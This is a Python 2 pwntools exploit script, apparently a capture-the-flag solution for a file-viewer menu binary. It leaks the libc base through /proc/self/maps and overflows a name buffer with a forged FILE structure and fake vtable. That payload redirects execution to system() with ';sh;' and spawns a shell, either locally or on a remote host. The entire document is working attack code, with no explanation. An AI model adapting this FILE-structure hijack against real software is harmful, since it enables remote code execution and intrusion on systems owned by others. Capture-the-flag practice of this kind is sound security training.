#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('Your choice :', str(index))

def open(filename):
    menu(1)
    p.sla('What do you want to see :', filename)

def read():
    menu(2)

def write():
    menu(3)

def close():
    menu(4)

def quit(content):
    menu(5)
    p.sla('Leave your name :', content)

if __name__ == '__main__':
    open('/proc/self/maps')
    read()
    write()
    content = p.ru('---')[:-4]
    read()
    write()
    content += p.ru('---')[:-4]
    libc.address = int(content.split('\n')[5][:8], 16)
    success('libc ' + hex(libc.address))
    io_file_addr = 0x0804B280 + 0x10
    vtable_addr = io_file_addr + 0xa0
    payload = flat('a' * 0x20, io_file_addr, 0x0, 0x0, 0x0)
    payload += (flat(0xfbad8001, ';sh;').ljust(0x94, '\x00') + p32(vtable_addr)).ljust(0xa0, '\x00')
    payload += flat(0x0, 0x0, libc.sym['system'])
    bc(libc.sym['system'])
    quit(payload)
    #gogogo('vmmap')
    p.i()
